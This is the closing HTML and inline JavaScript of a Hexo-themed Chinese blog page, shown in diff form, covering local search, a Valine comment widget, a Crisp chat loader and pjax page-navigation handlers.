fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://fastly.jsdelivr.net/npm/instant.page@5/instantpage.min.js" type="module"></script><script src="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'B9OoMs6vkuGJUaeS3FjECON0-gzGzoHsz',
+      appKey: '03bqTybh2h4Jbp0s5XTucplR',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://fastly.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideMobileSidebar.js"></script><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideCategory.min.js"></script><script>window.$crisp = [];
+window.CRISP_WEBSITE_ID = "4b34540b-3bd0-4089-9d4a-3760c14a4207";
+(function () {
+  d = document;
+  s = d.createElement("script");
+  s.src = "https://client.crisp.chat/l.js";
+  s.async = 1;
+  d.getElementsByTagName("head")[0].appendChild(s);
+})();
+$crisp.push(["safe", true])
+
+if (true) {
+  $crisp.push(["do", "chat:hide"])
+  $crisp.push(["on", "chat:closed", function() {
+    $crisp.push(["do", "chat:hide"])
+  }])
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      $crisp.push(["do", "chat:show"])
+      $crisp.push(["do", "chat:open"])
+
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      $crisp.push(["do", "chat:hide"])
+    }
+    function chatBtnShow () {
+      $crisp.push(["do", "chat:show"])
+    }
+  }
+}</script><script src="https://fastly.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax], .pjax-reload script').forEach(*item* *=>* {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
